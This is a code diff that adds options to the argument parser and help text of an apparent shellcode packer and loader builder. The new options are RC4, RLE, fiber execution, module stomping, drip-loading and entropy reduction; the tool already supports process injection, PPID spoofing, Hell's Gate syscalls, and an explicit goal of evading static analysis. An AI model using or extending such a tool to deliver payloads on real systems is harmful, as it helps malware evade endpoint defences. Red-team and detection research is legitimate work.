@@ -31,14 +31,14 @@ Payload:
 
 Encryption:
   --key <key>             Encryption key (random 32-char if omitted)
-  --cipher <cipher>       aes-ecb (default) | aes-cbc | xor
+  --cipher <cipher>       aes-ecb (default) | aes-cbc | xor | rc4
   --crypto-backend <be>   cng (default) | tiny-aes
 
 Encoding:
   --encode <method>       none (default) | base64 | hex | mac | uuid
 
 Compression:
-  --compress <method>     none (default) | zlib | lz4
+  --compress <method>     none (default) | zlib | lz4 | rle
 
 Obfuscation:
   --obfuscate             Enable source-level obfuscation
@@ -47,10 +47,12 @@ Obfuscation:
 
 Injection:
   --inject <method>       local (default) | remote
-  --execute <primitive>   direct (default) | thread | apc | callback
+  --execute <primitive>   direct (default) | thread | apc | callback | fiber
   --process <name>        Target for remote inject (default: RuntimeBroker.exe)
   --ppid <name>           Parent process name for PPID spoofing
   --block-dlls            Block non-Microsoft DLLs in spawned process
+  --module-stomp          Use module stomping for shellcode allocation
+  --drip                  Drip-load shellcode in small chunks
 
 Syscalls:
   --syscall <method>      indirect (default) | hellsgate | halosgate
@@ -75,6 +77,7 @@ Output:
   --hide                  Build as GUI app (no console window)
   --source-only           Emit generated source, don't compile
   --verbose               Loader prints debug output
+  --entropy-reduce        Reduce payload entropy to evade static analysis
 )" << std::endl;
 }
 
@@ -178,6 +181,7 @@ PackerConfig parse_args(int argc, char* argv[]) {
             if (c == "aes-ecb")       cfg.cipher = CipherMode::AES_ECB;
             else if (c == "aes-cbc")  cfg.cipher = CipherMode::AES_CBC;
             else if (c == "xor")      cfg.cipher = CipherMode::XOR;
+            else if (c == "rc4")      cfg.cipher = CipherMode::RC4;
             else { std::cerr << "[!] Unknown cipher: " << c << "\n"; std::exit(1); }
         } else if (arg == "--crypto-backend") {
             auto b = to_lower(get_next(i));
@@ -197,6 +201,7 @@ PackerConfig parse_args(int argc, char* argv[]) {
             if (c == "none")          cfg.compression = CompressionMethod::None;
             else if (c == "zlib")     cfg.compression = CompressionMethod::Zlib;
             else if (c == "lz4")      cfg.compression = CompressionMethod::LZ4;
+            else if (c == "rle")      cfg.compression = CompressionMethod::RLE;
             else { std::cerr << "[!] Unknown compression: " << c << "\n"; std::exit(1); }
         } else if (arg == "--obfuscate") {
             cfg.obfuscate = true;
@@ -215,6 +220,7 @@ PackerConfig parse_args(int argc, char* argv[]) {
             else if (p == "thread")   cfg.exec_prim = ExecutionPrimitive::Thread;
             else if (p == "apc")      cfg.exec_prim = ExecutionPrimitive::APC;
             else if (p == "callback") cfg.exec_prim = ExecutionPrimitive::Callback;
+            else if (p == "fiber")    cfg.exec_prim = ExecutionPrimitive::Fiber;
             else { std::cerr << "[!] Unknown execute: " << p << "\n"; std::exit(1); }
         } else if (arg == "--process") {
             cfg.target_process = get_next(i);
@@ -222,6 +228,10 @@ PackerConfig parse_args(int argc, char* argv[]) {
             cfg.ppid_process = get_next(i);
         } else if (arg == "--block-dlls") {
             cfg.block_dlls = true;
+        } else if (arg == "--module-stomp") {
+            cfg.module_stomp = true;
+        } else if (arg == "--drip") {
+            cfg.drip_load = true;
         } else if (arg == "--syscall") {
             auto s = to_lower(get_next(i));
             if (s == "indirect")        cfg.syscall_method = SyscallMethod::Indirect;
@@ -267,6 +277,8 @@ PackerConfig parse_args(int argc, char* argv[]) {
             cfg.source_only = true;
         } else if (arg == "--verbose") {
             cfg.verbose = true;
+        } else if (arg == "--entropy-reduce") {
+            cfg.entropy_reduce = true;
         } else if (arg == "--help" || arg == "-h") {
             print_usage();
             std::exit(0);
